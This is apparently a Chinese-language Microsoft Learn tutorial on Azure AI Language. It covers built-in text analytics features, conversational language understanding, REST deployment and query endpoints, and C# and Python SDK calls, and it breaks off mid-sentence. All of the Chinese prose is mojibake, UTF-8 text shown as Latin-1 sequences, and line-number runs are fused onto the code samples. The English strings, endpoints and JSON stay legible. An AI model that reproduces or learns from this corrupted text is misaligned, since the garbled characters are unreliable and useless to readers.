è¯­è¨€æœåŠ¡æä¾›çš„éƒ¨åˆ†åŠŸèƒ½ä¸éœ€è¦ä»»ä½•æ¨¡å‹æ ‡è®°å’Œè®­ç»ƒã€‚ åˆ›å»ºèµ„æºåï¼Œå¯ä»¥å‘é€æ•°æ®å¹¶åœ¨åº”ç”¨ä¸­ä½¿ç”¨è¿”å›çš„ç»“æœã€‚ ä»¥ä¸‹åŠŸèƒ½éƒ½æ˜¯é¢„é…ç½®çš„ã€‚ æ±‡æ€»æ‘˜è¦å¯ç”¨äºæ–‡æ¡£å’Œå¯¹è¯ï¼Œå¯å°†æ–‡æœ¬æ±‡æ€»åˆ°å…³é”®å¥ä¸­ï¼Œç³»ç»Ÿé€šè¿‡å¯¹å…³é”®å¥è¿›è¡Œé¢„æµ‹æ¥æ¦‚æ‹¬è¾“å…¥çš„å«ä¹‰ã€‚ å‘½åå®ä½“è¯†åˆ«å‘½åå®ä½“è¯†åˆ«å¯ä»¥æå–å’Œæ ‡è¯†å®ä½“ï¼ˆå¦‚äººå‘˜ã€åœ°ç‚¹æˆ–å…¬å¸ï¼‰ï¼Œä½¿åº”ç”¨èƒ½å¤Ÿè¯†åˆ«ä¸åŒç±»å‹çš„å®ä½“ï¼Œä»è€Œæ”¹è¿›è‡ªç„¶è¯­è¨€å“åº”ã€‚ ä¾‹å¦‚èƒ½ä»â€œThe waterfront pier is my favorite Seattle attractionâ€ä¸­è¯†åˆ«å‡ºâ€œSeattleâ€ï¼Œå¹¶å°†å…¶åˆ†ç±»ä¸ºåœ°ç‚¹ã€‚ ä¸ªäººèº«ä»½ä¿¡æ¯ (PII) æ£€æµ‹ä½¿ç”¨ PII æ£€æµ‹ï¼Œå¯ä»¥è¯†åˆ«ã€åˆ†ç±»å’Œç¼–è¾‘å¯èƒ½è¢«è§†ä¸ºæ•æ„Ÿä¿¡æ¯çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç”µå­é‚®ä»¶åœ°å€ã€å®¶åº­åœ°å€ã€IP åœ°å€ã€å§“åå’Œå—ä¿æŠ¤çš„è¿è¡ŒçŠ¶å†µä¿¡æ¯ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæŸ¥è¯¢ä¸­åŒ…å«æ–‡æœ¬â€œ&#x65;&#x6d;&#x61;&#105;&#108;&#x40;&#99;&#x6f;&#110;&#x74;&#x6f;&#x73;&#111;&#46;&#x63;&#111;&#x6d;â€ï¼Œåˆ™å¯ä»¥è¯†åˆ«å’Œä¿®æ”¹æ•´ä¸ªç”µå­é‚®ä»¶åœ°å€ã€‚ å…³é”®çŸ­è¯­æå–å…³é”®çŸ­è¯­æå–æ˜¯å¯å¿«é€Ÿä»æä¾›çš„æ–‡æœ¬ä¸­æå–ä¸»è¦æ¦‚å¿µçš„åŠŸèƒ½ã€‚ ä¾‹å¦‚ï¼Œè¯¥æœåŠ¡èƒ½ä»â€œText Analytics is one of the features in Azure AI Services.â€ä¸­è¯†åˆ«å‡ºâ€œAzure AI Servicesâ€å’Œâ€œText Analyticsâ€ã€‚ æƒ…ç»ªåˆ†ææƒ…ç»ªåˆ†ææ ‡è¯†å­—ç¬¦ä¸²æˆ–æ–‡æ¡£æ˜¯æ­£é¢è¿˜æ˜¯è´Ÿé¢çš„ã€‚ ä¾‹å¦‚è¯¥æœåŠ¡èƒ½ä»â€œGreat hotel. Close to plenty of food and attractions we could walk toâ€ä¸­è¯†åˆ«å‡ºæ­£é¢çš„ç»“æœï¼Œä¸”å…·æœ‰ç›¸å¯¹è¾ƒé«˜çš„ç½®ä¿¡åº¦åˆ†æ•°ã€‚ è¯­è¨€æ£€æµ‹è¯­è¨€æ£€æµ‹é‡‡ç”¨ä¸€ä¸ªæˆ–å¤šä¸ªæ–‡æ¡£ï¼Œå¹¶è¯†åˆ«æ¯ä¸ªæ–‡æ¡£çš„è¯­è¨€ã€‚ ä¾‹å¦‚è¯¥æœåŠ¡èƒ½ä»å…¶ä¸­ä¸€ä»½â€œBonjourâ€æ–‡æ¡£è¯†åˆ«å‡ºæ³•è¯­çš„ç»“æœã€‚ å­¦ä¹ çš„åŠŸèƒ½å­¦ä¹ çš„åŠŸèƒ½è¦æ±‚ä½ æ ‡è®°æ•°æ®ã€è®­ç»ƒå’Œéƒ¨ç½²æ¨¡å‹ï¼Œä½¿å…¶å¯åœ¨åº”ç”¨ç¨‹åºä¸­ä½¿ç”¨ã€‚ è¿™äº›åŠŸèƒ½å…è®¸è‡ªå®šä¹‰é¢„æµ‹æˆ–æå–çš„ä¿¡æ¯ã€‚ æ³¨æ„ æ•°æ®è´¨é‡æå¤§åœ°å½±å“æ¨¡å‹çš„å‡†ç¡®æ€§ã€‚ è¯·ç•™æ„ä½¿ç”¨çš„æ•°æ®ã€æ•°æ®çš„æ ‡è®°æƒ…å†µä»¥åŠè®­ç»ƒæ•°æ®çš„å¤šæ ·åŒ–ç¨‹åº¦ã€‚ æœ‰å…³è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜…æœ‰å…³æ ‡è®°æ•°æ®çš„å»ºè®®ï¼Œå…¶ä¸­åŒ…æ‹¬é’ˆå¯¹æ ‡è®°æ•°æ®çš„å®è´µæŒ‡å—ã€‚ å¦è¯·å‚é˜…è¯„ä¼°æŒ‡æ ‡ï¼Œå¯å¸®åŠ©ä½ äº†è§£æ¨¡å‹éœ€è¦æ”¹è¿›çš„åœ°æ–¹ã€‚ å¯¹è¯è¯­è¨€ç†è§£ (CLU)CLU æ˜¯ Azure AI è¯­è¨€æä¾›çš„æ ¸å¿ƒè‡ªå®šä¹‰åŠŸèƒ½ä¹‹ä¸€ã€‚ CLU å¯å¸®åŠ©ç”¨æˆ·ç”Ÿæˆè‡ªå®šä¹‰è‡ªç„¶è¯­è¨€ç†è§£æ¨¡å‹æ¥é¢„æµ‹æ•´ä½“æ„å‘ï¼Œå¹¶ä»ä¼ å…¥è¨€è¯­ä¸­æå–é‡è¦ä¿¡æ¯ã€‚ CLU è¦æ±‚ç”¨æˆ·æ ‡è®°æ•°æ®ï¼Œä»¥è®©å…¶å­¦ä¹ å¦‚ä½•å‡†ç¡®é¢„æµ‹æ„å‘å’Œå®ä½“ã€‚ æœ¬æ¨¡å—ä¸­çš„ç»ƒä¹ å°†ç”Ÿæˆ CLU æ¨¡å‹å¹¶åœ¨åº”ç”¨ä¸­ä½¿ç”¨å®ƒã€‚ è‡ªå®šä¹‰å‘½åå®ä½“è¯†åˆ«è‡ªå®šä¹‰å®ä½“è¯†åˆ«é‡‡ç”¨è‡ªå®šä¹‰æ ‡è®°æ•°æ®ï¼Œå¹¶ä»éç»“æ„åŒ–æ–‡æœ¬ä¸­æå–æŒ‡å®šçš„å®ä½“ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæœ‰éœ€è¦ä»ä¸­æå–å½“äº‹äººçš„å„ç§åˆåŒæ–‡æ¡£ï¼Œå¯ä»¥é€šè¿‡è®­ç»ƒæ¨¡å‹è®©æ¨¡å‹çŸ¥é“å¦‚ä½•è¿›è¡Œé¢„æµ‹ã€‚ è‡ªå®šä¹‰æ–‡æœ¬åˆ†ç±»ä½¿ç”¨è‡ªå®šä¹‰æ–‡æœ¬åˆ†ç±»ï¼Œç”¨æˆ·å¯ä»¥å°†æ–‡æœ¬æˆ–æ–‡æ¡£åˆ†ç±»ä¸ºè‡ªå®šä¹‰ç»„ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥è®­ç»ƒæ¨¡å‹æ¥æŸ¥çœ‹æ–°é—»æ–‡ç« ï¼Œå¹¶ç¡®å®šè¿™äº›ä¿¡æ¯çš„æ‰€è¿°ç±»åˆ«ï¼Œä¾‹å¦‚â€œæ–°é—»â€æˆ–â€œå¨±ä¹â€ã€‚ é—®ç­”é—®é¢˜è§£ç­”æ˜¯ä¸€é¡¹åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ä¼šé¢„é…çš„åŠŸèƒ½ï¼Œå¯è§£ç­”ä½œä¸ºè¾“å…¥æä¾›çš„é—®é¢˜ã€‚ å›ç­”è¿™äº›é—®é¢˜çš„æ•°æ®æ¥è‡ªå¸¸è§é—®é¢˜è§£ç­”æˆ–æ‰‹å†Œç­‰æ–‡æ¡£ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä½ æƒ³è¦åœ¨å…¬å¸ç½‘ç«™ä¸Šåˆ›å»ºè™šæ‹ŸèŠå¤©åŠ©æ‰‹æ¥å›ç­”å¸¸è§é—®é¢˜ã€‚ å¯ä»¥ä½¿ç”¨å…¬å¸å¸¸è§é—®é¢˜è§£ç­”ä½œä¸ºè¾“å…¥æ–‡æ¡£æ¥åˆ›å»ºé—®é¢˜å’Œç­”æ¡ˆå¯¹ã€‚ éƒ¨ç½²åï¼ŒèŠå¤©åŠ©æ‰‹å¯ä»¥å°†è¾“å…¥é—®é¢˜ä¼ é€’ç»™æœåŠ¡ï¼Œå¹¶ä»¥ç»“æœå½¢å¼è·å–è§£ç­”ã€‚ è‹¥è¦æŸ¥çœ‹åŠŸèƒ½çš„å®Œæ•´åˆ—è¡¨ä»¥åŠä½¿ç”¨æ–¹æ³•ï¼Œè¯·å‚é˜… Azure AI è¯­è¨€æ–‡æ¡£ã€‚ äº†è§£ç”¨äºç”Ÿæˆå¯¹è¯è¯­è¨€ç†è§£æ¨¡å‹çš„èµ„æº 9 åˆ†é’Ÿ è‹¥è¦ä½¿ç”¨è¯­è¨€ç†è§£æœåŠ¡å¼€å‘ NLP è§£å†³æ–¹æ¡ˆï¼Œéœ€è¦åœ¨ Azure ä¸­åˆ›å»ºè¯­è¨€èµ„æºã€‚ è¯¥èµ„æºå°†ç”¨äºåˆ›ä½œæ¨¡å‹å’Œå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯åº”ç”¨ç¨‹åºçš„é¢„æµ‹è¯·æ±‚ã€‚ æç¤º æœ¬æ¨¡å—çš„å®éªŒå®¤ä»‹ç»å¦‚ä½•æ„å»ºç”¨äºå¯¹è¯è¯­è¨€ç†è§£çš„æ¨¡å‹ã€‚ æœ‰å…³è‡ªå®šä¹‰æ–‡æœ¬åˆ†ç±»å’Œè‡ªå®šä¹‰å‘½åå®ä½“è¯†åˆ«çš„æ›´å¤šé‡ç‚¹æ¨¡å—ï¼Œè¯·å‚é˜…å¼€å‘è‡ªç„¶è¯­è¨€è§£å†³æ–¹æ¡ˆå­¦ä¹ è·¯å¾„ä¸­çš„è‡ªå®šä¹‰è§£å†³æ–¹æ¡ˆæ¨¡å—ã€‚ æ„å»ºä½ çš„æ¨¡å‹å¯¹äºéœ€è¦æ¨¡å‹è¿›è¡Œé¢„æµ‹çš„åŠŸèƒ½ï¼Œéœ€è¦å…ˆç”Ÿæˆã€è®­ç»ƒå¹¶éƒ¨ç½²æ¨¡å‹ï¼Œæ‰èƒ½å°†å…¶ç”¨äºé¢„æµ‹ã€‚ é€šè¿‡ç”Ÿæˆå’Œè®­ç»ƒè®© Azure AI è¯­è¨€æœåŠ¡å­¦ä¹ è¦æŸ¥æ‰¾çš„å†…å®¹ã€‚ é¦–å…ˆï¼Œéœ€è¦åœ¨ Azure é—¨æˆ·ä¸­åˆ›å»º Azure AI è¯­è¨€èµ„æºã€‚ ç„¶åï¼š æœç´¢ Azure AI æœåŠ¡ã€‚ æŸ¥æ‰¾å¹¶é€‰æ‹©â€œè¯­è¨€æœåŠ¡â€ã€‚ é€‰æ‹©â€œè¯­è¨€æœåŠ¡â€ä¸‹çš„â€œåˆ›å»ºâ€ã€‚ å¡«å†™å¿…è¦çš„è¯¦ç»†ä¿¡æ¯ï¼Œé€‰æ‹©åœ¨åœ°ç†ä½ç½®ä¸Šæœ€é è¿‘çš„åŒºåŸŸï¼ˆä»¥è·å¾—æœ€ä½³æ€§èƒ½ï¼‰ï¼Œå¹¶ä¸ºå…¶æä¾›å”¯ä¸€çš„åç§°ã€‚ åˆ›å»ºè¯¥èµ„æºåï¼Œéœ€è¦å¯†é’¥å’Œç»ˆç»“ç‚¹ã€‚ å¯ä»¥åœ¨èµ„æºæ¦‚è¿°é¡µçš„â€œå¯†é’¥å’Œç»ˆç»“ç‚¹â€ä¸‹çš„å·¦ä¾§æ‰¾åˆ°è¯¥ä¿¡æ¯ã€‚ ä½¿ç”¨è¯­è¨€å·¥ä½œå®¤è‹¥è¦æ›´ç›´è§‚åœ°ç”Ÿæˆã€è®­ç»ƒå’Œéƒ¨ç½²æ¨¡å‹ï¼Œå¯ä»¥ä½¿ç”¨ Language Studio æ¥å®ç°ä¸Šè¿°æ¯ä¸ªæ­¥éª¤ã€‚ åœ¨ä¸»é¡µä¸Šï¼Œå¯ä»¥é€‰æ‹©åˆ›å»ºå¯¹è¯è¯­è¨€ç†è§£é¡¹ç›®ã€‚ åˆ›å»ºé¡¹ç›®åï¼Œè¯·å®Œæˆä¸ä¸Šè¿°å†…å®¹ç›¸åŒçš„è¿‡ç¨‹æ¥ç”Ÿæˆã€è®­ç»ƒå’Œéƒ¨ç½²æ¨¡å‹ã€‚ æœ¬æ¨¡å—ä¸­çš„å®éªŒå®¤å°†é€æ­¥è®²è§£å¦‚ä½•ä½¿ç”¨ Language Studio ç”Ÿæˆæ¨¡å‹ã€‚ è‹¥è¦äº†è§£è¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… Language Studio å¿«é€Ÿå…¥é—¨ ä½¿ç”¨ REST APIç”Ÿæˆæ¨¡å‹çš„ä¸€ç§æ–¹æ³•æ˜¯é€šè¿‡ REST API ç”Ÿæˆã€‚ è¯¥æ¨¡å¼æ˜¯åˆ›å»ºé¡¹ç›®ã€å¯¼å…¥æ•°æ®ã€è®­ç»ƒã€éƒ¨ç½²ï¼Œç„¶åä½¿ç”¨æ¨¡å‹ã€‚ è¿™äº›ä»»åŠ¡ä»¥å¼‚æ­¥æ–¹å¼å®Œæˆï¼›éœ€è¦å‘æ¯ä¸ªæ­¥éª¤çš„ç›¸åº” URI æäº¤è¯·æ±‚ï¼Œç„¶åå‘é€å¦ä¸€ä¸ªè¯·æ±‚ä»¥è·å–è¯¥ä½œä¸šçš„çŠ¶æ€ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœè¦ä¸ºå¯¹è¯è¯­è¨€ç†è§£é¡¹ç›®éƒ¨ç½²æ¨¡å‹ï¼Œåˆ™éœ€è¦æäº¤éƒ¨ç½²ä½œä¸šï¼Œç„¶åæ£€æŸ¥éƒ¨ç½²ä½œä¸šçŠ¶æ€ã€‚ èº«ä»½éªŒè¯å¯¹äºå¯¹ Azure AI è¯­è¨€èµ„æºçš„æ¯ä¸ªè°ƒç”¨ï¼Œå¯ä»¥é€šè¿‡æä¾›ä»¥ä¸‹æ ‡å¤´å¯¹è¯·æ±‚è¿›è¡Œèº«ä»½éªŒè¯ã€‚ å¯†é’¥ å€¼ Ocp-Apim-Subscription-Key èµ„æºå¯†é’¥ è¯·æ±‚éƒ¨ç½²å°† POST è¯·æ±‚æäº¤åˆ°ä»¥ä¸‹ç»ˆç»“ç‚¹ã€‚ 1&#123;ENDPOINT&#125;/language/authoring/analyze-conversations/projects/&#123;PROJECT-NAME&#125;/deployments/&#123;DEPLOYMENT-NAME&#125;?api-version=&#123;API-VERSION&#125; å ä½ç¬¦ å€¼ ç¤ºä¾‹ &#123;ENDPOINT&#125; Azure AI è¯­è¨€èµ„æºçš„ç»ˆç»“ç‚¹ https://&lt;your-subdomain&gt;.cognitiveservices.azure.com &#123;PROJECT-NAME&#125; é¡¹ç›®åç§°ã€‚ æ­¤å€¼åŒºåˆ†å¤§å°å†™ myProject &#123;DEPLOYMENT-NAME&#125; éƒ¨ç½²åç§°ã€‚ æ­¤å€¼åŒºåˆ†å¤§å°å†™ staging &#123;API-VERSION&#125; è¦è°ƒç”¨çš„ API ç‰ˆæœ¬ 2022-05-01 è¯·åœ¨è¯·æ±‚ä¸­åŒ…æ‹¬ä»¥ä¸‹ bodyã€‚ 123&#123; &quot;trainedModelLabel&quot;: &quot;&#123;MODEL-NAME&#125;&quot;,&#125; å ä½ç¬¦ å€¼ &#123;MODEL-NAME&#125; å°†è¦åˆ†é…ç»™éƒ¨ç½²çš„æ¨¡å‹åç§°ã€‚ æ­¤å€¼åŒºåˆ†å¤§å°å†™ã€‚ è‹¥æˆåŠŸæäº¤è¯·æ±‚ï¼Œå°†æ”¶åˆ° 202 å“åº”ï¼Œå¹¶å¸¦æœ‰å“åº”æ ‡å¤´ operation-locationã€‚ æ­¤æ ‡å¤´å°†å…·æœ‰ä¸€ä¸ª URLï¼Œç”¨äºè¯·æ±‚çŠ¶æ€ï¼Œæ ¼å¼å¦‚ä¸‹æ‰€ç¤ºï¼š 1&#123;ENDPOINT&#125;/language/authoring/analyze-conversations/projects/&#123;PROJECT-NAME&#125;/deployments/&#123;DEPLOYMENT-NAME&#125;/jobs/&#123;JOB-ID&#125;?api-version=&#123;API-VERSION&#125; è·å–éƒ¨ç½²çŠ¶æ€å°† GET è¯·æ±‚æäº¤åˆ°ä¸Šè¿°å“åº”æ ‡å¤´ä¸­çš„ URLã€‚ è¿™äº›å€¼å·²æ ¹æ®åˆå§‹éƒ¨ç½²è¯·æ±‚å¡«å†™ã€‚ 1&#123;ENDPOINT&#125;/language/authoring/analyze-conversations/projects/&#123;PROJECT-NAME&#125;/deployments/&#123;DEPLOYMENT-NAME&#125;/jobs/&#123;JOB-ID&#125;?api-version=&#123;API-VERSION&#125; å ä½ç¬¦ å€¼ &#123;ENDPOINT&#125; ç”¨äºå¯¹ API è¯·æ±‚è¿›è¡Œèº«ä»½éªŒè¯çš„ç»ˆç»“ç‚¹ &#123;PROJECT-NAME&#125; é¡¹ç›®åç§°ï¼ˆå€¼åŒºåˆ†å¤§å°å†™ï¼‰ &#123;DEPLOYMENT-NAME&#125; éƒ¨ç½²åç§°ï¼ˆå€¼åŒºåˆ†å¤§å°å†™ï¼‰ &#123;JOB-ID&#125; ç”¨äºæŸ¥æ‰¾æ¨¡å‹è®­ç»ƒçŠ¶æ€çš„ IDï¼Œå¯åœ¨ä¸Šæ–‡éƒ¨ç½²è¯·æ±‚ä¸­è¯¦è¿°çš„æ ‡å¤´å€¼ä¸­æ‰¾åˆ° &#123;API-VERSION&#125; è¦è°ƒç”¨çš„ API ç‰ˆæœ¬ å“åº”æ­£æ–‡å°†æä¾›éƒ¨ç½²çŠ¶æ€è¯¦ç»†ä¿¡æ¯ã€‚ å½“éƒ¨ç½²å®Œæˆæ—¶ï¼Œstatus å­—æ®µçš„å€¼ä¼šä¸ºâ€œå·²æˆåŠŸâ€ã€‚ 1234567&#123; &quot;jobId&quot;:&quot;&#123;JOB-ID&#125;&quot;, &quot;createdDateTime&quot;:&quot;String&quot;, &quot;lastUpdatedDateTime&quot;:&quot;String&quot;, &quot;expirationDateTime&quot;:&quot;String&quot;, &quot;status&quot;:&quot;running&quot;&#125; è‹¥è¦æŸ¥çœ‹ç¤ºä¾‹è¯·æ±‚çš„æ¯ä¸ªæ­¥éª¤çš„å®Œæ•´æ¼”ç»ƒï¼Œè¯·å‚é˜…å¯¹è¯ç†è§£å¿«é€Ÿå…¥é—¨ã€‚ æŸ¥è¯¢ä½ çš„æ¨¡å‹è‹¥è¦æŸ¥è¯¢æ¨¡å‹ä»¥è¿›è¡Œé¢„æµ‹ï¼Œå¯ä»¥ä½¿ç”¨ C# æˆ– Python ä¸­çš„ SDKï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ REST APã€‚ ä½¿ç”¨ SDK è¿›è¡ŒæŸ¥è¯¢è‹¥è¦ä½¿ç”¨ SDK æŸ¥è¯¢ä½ çš„æ¨¡å‹ï¼Œä½ é¦–å…ˆéœ€è¦åˆ›å»ºå®¢æˆ·ç«¯ã€‚ å…·æœ‰å®¢æˆ·ç«¯åï¼Œå³å¯ä½¿ç”¨å®ƒæ¥è°ƒç”¨ç›¸åº”çš„ç»ˆç»“ç‚¹ã€‚ 12var languageClient = new TextAnalyticsClient(endpoint, credentials);var response = languageClient.ExtractKeyPhrases(document); 1234language_client = TextAnalyticsClient( endpoint=endpoint, credential=credentials)response = language_client.extract_key_phrases(documents = documents)[0] å…¶ä»–è¯­è¨€åŠŸèƒ½ï¼ˆä¾‹å¦‚å¯¹è¯è¯­è¨€ç†è§£ï¼‰è¦æ±‚ä»¥ä¸åŒçš„æ–¹å¼æ„å»ºå’Œå‘é€è¯·æ±‚ã€‚ 123456789101112131415161718192021var data = new&#123; analysisInput = new &#123; conversationItem = new &#123; text = userText, id = &quot;1&quot;, participantId = &quot;1&quot;, &#125; &#125;, parameters = new &#123; projectName, deploymentName, // Use Utf16CodeUnit for strings in .NET. stringIndexType = &quot;Utf16CodeUnit&quot;, &#125;, kind = &quot;Conversation&quot;,&#125;;Response response = await client.AnalyzeConversationAsync(RequestContent.Create(data)); 1234567891011121314151617181920result = client.analyze_conversation( task=&#123; &quot;kind&quot;: &quot;Conversation&quot;, &quot;analysisInput&quot;: &#123; &quot;conversationItem&quot;: &#123; &quot;participantId&quot;: &quot;1&quot;, &quot;id&quot;: &quot;1&quot;, &quot;modality&quot;: &quot;text&quot;, &quot;language&quot;: &quot;en&quot;, &quot;text&quot;: query &#125;, &quot;isLoggingEnabled&quot;: False &#125;, &quot;parameters&quot;: &#123; &quot;projectName&quot;: cls_project, &quot;deploymentName&quot;: deployment_slot, &quot;verbose&quot;: True &#125; &#125;) ä½¿ç”¨ REST API è¿›è¡ŒæŸ¥è¯¢è‹¥è¦ä½¿ç”¨ REST æŸ¥è¯¢ä½ çš„æ¨¡å‹ï¼Œè¯·ä½¿ç”¨æŒ‡å®šçš„ç›¸åº”æ­£æ–‡åˆ›å»ºå¯¹ç›¸åº” URL çš„ POST è¯·æ±‚ã€‚ å¯¹äºå†…ç½®åŠŸèƒ½ï¼ˆå¦‚è¯­è¨€æ£€æµ‹æˆ–æƒ…ç»ªåˆ†æï¼‰ï¼Œä½ å°†æŸ¥è¯¢ analyze-text ç»ˆç»“ç‚¹ã€‚ æç¤º è¯·è®°ä½ï¼Œæ¯ä¸ªè¯·æ±‚éƒ½éœ€è¦ä½¿ç”¨ Ocp-Apim-Subscription-Key æ ‡å¤´ä¸­çš„ Azure AI è¯­è¨€èµ„æºå¯†é’¥è¿›è¡Œèº«ä»½éªŒè¯ 1&#123;ENDPOINT&#125;/language/:analyze-text?api-version=&#123;API-VERSION&#125; å ä½ç¬¦ å€¼ &#123;ENDPOINT&#125; ç”¨äºå¯¹ API è¯·æ±‚è¿›è¡Œèº«ä»½éªŒè¯çš„ç»ˆç»“ç‚¹ &#123;API-VERSION&#125; è¦è°ƒç”¨çš„ API ç‰ˆæœ¬ åœ¨è¯¥è¯·æ±‚çš„æ­£æ–‡ä¸­ï¼Œå¿…é¡»æŒ‡å®š kind å‚æ•°ï¼Œè¯¥å‚æ•°å‘ŠçŸ¥æœåŠ¡ä½ æ‰€è¯·æ±‚çš„è¯­è¨€ç†è§£ç±»å‹ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœæƒ³è¦æ£€æµ‹è¯­è¨€ï¼Œåˆ™ JSON æ­£æ–‡å°†å¦‚ä¸‹æ‰€ç¤ºã€‚ 1234567891011121314&#123; &quot;kind&quot;: &quot;LanguageDetection&quot;, &quot;parameters&quot;: &#123; &quot;modelVersion&quot;: &quot;latest&quot; &#125;, &quot;analysisInput&quot;:&#123; &quot;documents&quot;:[ &#123; &quot;id&quot;:&quot;1&quot;, &quot;text&quot;: &quot;This is a document written in English.&quot; &#125; ] &#125;&#125; å…¶ä»–è¯­è¨€åŠŸèƒ½ï¼ˆä¾‹å¦‚å¯¹è¯è¯­è¨€ç†è§£ï¼‰è¦æ±‚å°†è¯·æ±‚è·¯ç”±åˆ°å…¶ä»–ç»ˆç»“ç‚¹ã€‚ ä¾‹å¦‚ï¼Œå¯¹è¯è¯­è¨€ç†è§£è¯·æ±‚å°†è¢«å‘é€åˆ°ä»¥ä¸‹ä½ç½®ã€‚ 1&#123;ENDPOINT&#125;/language/:analyze-conversations?api-version=&#123;API-VERSION&#125; å ä½ç¬¦ å€¼ &#123;ENDPOINT&#125; ç”¨äºå¯¹ API è¯·æ±‚è¿›è¡Œèº«ä»½éªŒè¯çš„ç»ˆç»“ç‚¹ &#123;API-VERSION&#125; è¦è°ƒç”¨çš„ API ç‰ˆæœ¬ è¯¥è¯·æ±‚å°†åŒ…å«ç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„ JSON æ­£æ–‡ã€‚ 123456789101112131415&#123; &quot;kind&quot;: &quot;Conversation&quot;, &quot;analysisInput&quot;: &#123; &quot;conversationItem&quot;: &#123; &quot;id&quot;: &quot;1&quot;, &quot;participantId&quot;: &quot;1&quot;, &quot;text&quot;: &quot;Sample text&quot; &#125; &#125;, &quot;parameters&quot;: &#123; &quot;projectName&quot;: &quot;&#123;PROJECT-NAME&#125;&quot;, &quot;deploymentName&quot;: &quot;&#123;DEPLOYMENT-NAME&#125;&quot;, &quot;stringIndexType&quot;: &quot;TextElement_V8&quot; &#125;&#125; å ä½ç¬¦ å€¼ &#123;PROJECT-NAME&#125; ç”Ÿæˆæ¨¡å‹çš„é¡¹ç›®çš„åç§° &#123;DEPLOYMENT-NAME&#125; éƒ¨ç½²çš„åç§° ç¤ºä¾‹å“åº”æ¥è‡ª SDK çš„æŸ¥è¯¢å“åº”å°†å‡ºç°åœ¨è¿”å›çš„å¯¹è±¡ä¸­ï¼Œå…·ä½“å–å†³äºåŠŸèƒ½ï¼ˆä¾‹å¦‚åœ¨ response.key_phrases æˆ– response.Value ä¸­ï¼‰ã€‚ REST API å°†è¿”å›ç±»ä¼¼äºä»¥ä¸‹å†…å®¹çš„ JSONã€‚ 123456789101112&#123; &quot;kind&quot;: &quot;KeyPhraseExtractionResults&quot;, &quot;results&quot;: &#123; &quot;documents&quot;: [&#123; &quot;id&quot;: &quot;1&quot;, &quot;keyPhrases&quot;: [&quot;modern medical office&quot;, &quot;Dr. Smith&quot;, &quot;great staff&quot;], &quot;warnings&quot;: [] &#125;], &quot;errors&quot;: [], &quot;modelVersion&quot;: &quot;&#123;VERSION&#125;&quot; &#125;&#125; å¯¹äºå¯¹è¯è¯­è¨€ç†è§£ç­‰å…¶ä»–æ¨¡å‹ï¼Œå¯¹æŸ¥è¯¢çš„ç¤ºä¾‹å“åº”å°†ç±»ä¼¼äºä»¥ä¸‹å†…å®¹ã€‚ 1234567891011121314151617181920212223242526272829&#123; &quot;kind&quot;: &quot;ConversationResult&quot;, &quot;result&quot;: &#123; &quot;query&quot;: &quot;String&quot;, &quot;prediction&quot;: &#123; &quot;topIntent&quot;: &quot;intent1&quot;, &quot;projectKind&quot;: &quot;Conversation&quot;, &quot;intents&quot;: [ &#123; &quot;category&quot;: &quot;intent1&quot;, &quot;confidenceScore&quot;: 1 &#125;, &#123; &quot;category&quot;: &quot;intent2&quot;, &quot;confidenceScore&quot;: 0 &#125; ], &quot;entities&quot;: [ &#123; &quot;category&quot;: &quot;entity1&quot;, &quot;text&quot;: &quot;text&quot;, &quot;offset&quot;: 7, &quot;length&quot;: 4, &quot;confidenceScore&quot;: 1 &#125; ] &#125; &#125;&#125; Python å’Œ C# çš„ SDK è¿”å›ä¸ REST å“åº”éå¸¸ç›¸ä¼¼çš„ JSONã€‚ æœ‰å…³åŠŸèƒ½çš„å®Œæ•´æ–‡æ¡£ï¼ˆåŒ…æ‹¬ç¤ºä¾‹å’Œæ“ä½œæŒ‡å—ï¼‰ï¼Œè¯·å‚é˜… Azure AI è¯­è¨€æ–‡æ¡£çš„æ–‡æ¡£é¡µã€‚ å®šä¹‰æ„å‘ã€è¨€è¯­å’Œå®ä½“è¯­å¥æ˜¯ç”¨æˆ·åœ¨ä¸ä½¿ç”¨è¯­è¨€æ¨¡å‹çš„åº”ç”¨ç¨‹åºè¿›è¡Œäº¤äº’æ—¶å¯èƒ½è¾“å…¥çš„çŸ­è¯­ã€‚ æ„å‘è¡¨ç¤ºç”¨æˆ·æƒ³æ‰§è¡Œçš„ä»»åŠ¡æˆ–æ“ä½œï¼Œæˆ–æ›´ç®€å•åœ°è¡¨ç¤ºè¨€è¯­çš„å«ä¹‰ã€‚ é€šè¿‡å®šä¹‰æ„å‘å¹¶å°†å…¶ä¸ä¸€ä¸ªæˆ–å¤šä¸ªè¨€è¯­å…³è”æ¥åˆ›å»ºæ¨¡å‹ã€‚ ä¾‹å¦‚ï¼Œè€ƒè™‘ä¸‹é¢åŒ…å«æ„å‘å’Œå…³è”è¨€è¯­çš„åˆ—è¡¨ï¼š GetTimeï¼š â€œWhat time is it?â€ â€œWhat is the time?â€ â€œTell me the timeâ€ GetWeatherï¼š â€œWhat is the weather forecast?â€ â€œDo I need an umbrella?â€ â€œWill it snow?â€ TurnOnDevice â€œTurn the light on.â€ â€œSwitch on the light.â€ â€œTurn on the fanâ€ æ— ï¼š â€œHelloâ€ â€œGoodbyeâ€ åœ¨ä½ çš„æ¨¡å‹ä¸­ï¼Œä½ å¿…é¡»å®šä¹‰ä½ å¸Œæœ›æ¨¡å‹èƒ½å¤Ÿç†è§£çš„æ„å‘ï¼Œå› æ­¤è¯·èŠ±ä¸€äº›æ—¶é—´æ€è€ƒæ¨¡å‹å¿…é¡»æ”¯æŒçš„é¢†åŸŸï¼Œä»¥åŠç”¨æˆ·å¯èƒ½è¯·æ±‚çš„æ“ä½œæˆ–ä¿¡æ¯ç±»å‹ã€‚ é™¤äº†ä½ å®šä¹‰çš„æ„å‘ä¹‹å¤–ï¼Œæ¯ä¸ªæ¨¡å‹è¿˜åŒ…æ‹¬â€œæ— â€æ„å‘ï¼Œåº”ä½¿ç”¨è¯¥æ„å‘æ¥æ˜¾å¼æ 